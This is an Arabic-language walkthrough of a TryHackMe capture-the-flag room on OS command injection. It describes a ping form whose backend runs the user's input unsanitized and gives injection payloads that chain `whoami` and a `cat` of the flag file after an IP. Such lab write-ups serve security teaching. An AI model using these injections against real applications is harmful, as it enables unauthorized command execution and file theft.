# TryHackMe — دليل عملي لحل غرفة OS Command Injection

[![المنصة](https://img.shields.io/badge/Platform-TryHackMe-red)](https://tryhackme.com/)
[![الفئة](https://img.shields.io/badge/Category-Command%20Injection-red)]()

شرح عملي وتوجيهي للغرفة التطبيقية الخاصة بحقن أوامر النظام في منصة TryHackMe.

---

## سيناريو الغرفة
يوفر التطبيق واجهة مستخدم تقوم بعمل `ping` على عنوان IP يحدده المستخدم لفحص اتصاله بالشبكة.
في الباك إند، يقوم السكربت بتنفيذ:
```bash
ping -c 1 $ip
```

---

## خطوات الاستغلال والحل:
1. استخدم الفاصل التسلسلي في لينكس `;` بعد أي IP تجريبي:
   `127.0.0.1; whoami`
2. ستجد أن التطبيق نفذ أمر الـ ping ثم طبع لك اسم المستخدم تحته مباشرة في الشاشة!
3. لاستخراج العلم (Flag):
   `127.0.0.1; cat /home/tryhackme/flag.txt`
4. سيظهر لك محتوى العلم `THM{...}` فوراً في الشاشة.
